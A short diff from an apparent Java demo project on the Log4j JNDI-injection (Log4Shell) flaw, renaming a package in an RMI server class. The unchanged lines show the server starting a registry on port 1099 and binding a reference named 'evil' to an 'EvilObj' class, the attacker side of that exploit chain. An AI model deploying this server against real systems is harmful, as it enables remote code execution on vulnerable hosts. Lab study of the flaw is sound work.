@@ -1,4 +1,4 @@
-package com.eric.javademo.log4jTest;
+package com.eric.javaDemo.log4jTest;
 
 import com.sun.jndi.rmi.registry.ReferenceWrapper;
 
@@ -21,7 +21,7 @@ public class RMIServer {
             LocateRegistry.createRegistry(1099);
             Registry registry = LocateRegistry.getRegistry();
             System.out.println("Create RMI registry on port 1099");
-            Reference reference = new Reference("com.eric.javademo.log4jTest.EvilObj", "com.eric.javademo.log4jTest.EvilObj", null);
+            Reference reference = new Reference("com.eric.javaDemo.log4jTest.EvilObj", "com.eric.javaDemo.log4jTest.EvilObj", null);
             ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
             registry.bind("evil", referenceWrapper);
         } catch (Exception e) {
